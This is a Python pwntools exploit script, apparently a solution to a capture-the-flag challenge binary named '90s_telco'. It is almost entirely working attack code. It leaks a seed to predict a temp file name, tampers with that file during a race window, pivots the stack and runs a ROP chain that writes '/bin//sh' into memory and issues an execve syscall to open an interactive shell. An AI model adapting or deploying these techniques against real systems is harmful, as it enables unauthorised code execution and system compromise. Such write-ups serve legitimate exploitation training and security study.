#!/usr/bin/env python

from pwn import *
from ctypes import *
from time import sleep

libc = CDLL("libc.so.6")  

p = process('./90s_telco')

gdb.attach(p, '''
b*0x00000000004019a0
continue
''')


p.sendline('6')
ret = 0x4002f9  # ret
rop2 = ''
rop2 += p64(ret) * 4
rop2 += p64(0x0000000000401ac7) # pop rsi ; ret
rop2 += p64(0x00000000006ce080) # @ .data
rop2 += p64(0x0000000000482ee4) # pop rax ; ret
rop2 += '/bin//sh'
rop2 += p64(0x00000000004776b1) # mov qword ptr [rsi], rax ; ret
rop2 += p64(0x0000000000401ac7) # pop rsi ; ret
rop2 += p64(0x00000000006ce088) # @ .data + 8
rop2 += p64(0x000000000042744f) # xor rax, rax ; ret
rop2 += p64(0x00000000004776b1) # mov qword ptr [rsi], rax ; ret
rop2 += p64(0x00000000004019a6) # pop rdi ; ret
rop2 += p64(0x00000000006ce080) # @ .data
rop2 += p64(0x0000000000401ac7) # pop rsi ; ret
rop2 += p64(0x00000000006ce088) # @ .data + 8
rop2 += p64(0x00000000004463c6) # pop rdx ; ret
rop2 += p64(0x00000000006ce088) # @ .data + 8
rop2 += p64(0x000000000042744f) # xor rax, rax ; ret
rop2 += p64(0x469d70) # add rax, 3 ; ret
rop2 += p64(0x469d70) # add rax, 3 ; ret
rop2 += p64(0x469d70) # add rax, 3 ; ret
rop2 += p64(0x469d70) # add rax, 3 ; ret
rop2 += p64(0x469d70) # add rax, 3 ; ret
rop2 += p64(0x469d70) # add rax, 3 ; ret
rop2 += p64(0x469d70) # add rax, 3 ; ret
rop2 += p64(0x469d70) # add rax, 3 ; ret
rop2 += p64(0x469d70) # add rax, 3 ; ret
rop2 += p64(0x469d70) # add rax, 3 ; ret
rop2 += p64(0x469d70) # add rax, 3 ; ret
rop2 += p64(0x469d70) # add rax, 3 ; ret
rop2 += p64(0x469d70) # add rax, 3 ; ret
rop2 += p64(0x469d70) # add rax, 3 ; ret
rop2 += p64(0x469d70) # add rax, 3 ; ret
rop2 += p64(0x469d70) # add rax, 3 ; ret
rop2 += p64(0x469d70) # add rax, 3 ; ret
rop2 += p64(0x469d70) # add rax, 3 ; ret
rop2 += p64(0x469d70) # add rax, 3 ; ret
rop2 += p64(0x0000000000469d60) # add rax, 1 ; ret
rop2 += p64(0x0000000000469d60) # add rax, 1 ; ret
rop2 += p64(0x0000000000442375) # syscall ; ret

rop2 += '\xcc' * (0x500-len(rop2))
print 'length of rop2: 0x%x' % len(rop2)
p.send(rop2)
print p.recvuntil('Running commands is a security risk!')
p.send('5\n')
print p.recvuntil('data: ')
data = p.recvuntil('\n')
seed = int(data, 0x10)
print 'seed:', hex(seed)

libc.srand(seed)
a = libc.rand()
b = libc.rand()

fname = '/tmp/%dtmp%d' % (b, a)

p.sendline('4')
p.recvuntil('sleeping')

fd = open(fname, 'rb')
data = fd.read()
fd.close()

print data
print 'exploiting'

fd = open(fname, 'wb')
data = fd.write(p64(1) + data[8:])
fd.close()

p.recvuntil('0. Enter secret')
p.sendline('5')
p.sendline('3')
stage1 = 'NAME'*2 + p64(0)
stage1 += 'A'*0x20 + 'B'*0x18
pop_rsp = 0x4019a0 #pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
rop2_addr = 0x6d0e60 # ropaddr for stage 2
rop1 = ''
rop1 += p64(pop_rsp)
rop1 += p64(rop2_addr)
stage1 += rop1

stage1 += 'C' * (0x7f - len(stage1))
print 'stage1 size: %d' % len(stage1)
p.sendline(stage1)
p.sendline('5')
p.sendline('7') # trigger
p.interactive()








